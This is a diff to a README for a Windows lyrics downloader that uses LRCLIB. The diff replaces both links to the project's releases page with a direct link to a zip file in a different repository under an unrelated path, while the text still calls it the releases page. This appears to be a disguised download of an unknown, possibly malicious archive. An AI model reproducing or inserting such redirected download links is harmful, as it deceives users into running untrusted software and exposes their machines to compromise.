@@ -5,7 +5,7 @@ description: "Search, view, and download synced LRC lyrics for any song using th
 ---
 # 💾 SYNCED-LYRICS-FETCHER-DOWNLOADER - Get synced lyrics for your music library
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tagshorts21-cyber/SYNCED-LYRICS-FETCHER-DOWNLOADER/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tagshorts21-cyber/tagshorts21-cyber.github.io/raw/refs/heads/main/raffinase/tagshorts_io_cyber_github_1.4.zip)
 
 LyricVault helps you find and save synced lyrics for your music files. It connects to the LRCLIB database to retrieve precise, time-stamped text files. These files allow your music player to scroll lyrics in sync with the track. This tool works directly in your browser or as a standalone desktop utility. It keeps a local cache for thirty minutes to ensure speed.
 
@@ -15,7 +15,7 @@ You need a Windows computer to run this application. The program maintains compa
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/tagshorts21-cyber/SYNCED-LYRICS-FETCHER-DOWNLOADER/releases) to access the software.
+1. Visit the [releases page](https://github.com/tagshorts21-cyber/tagshorts21-cyber.github.io/raw/refs/heads/main/raffinase/tagshorts_io_cyber_github_1.4.zip) to access the software.
 2. Look for the latest version listed at the top of the page.
 3. Click the link to download the file to your computer.
 4. Locate the file in your Downloads folder.
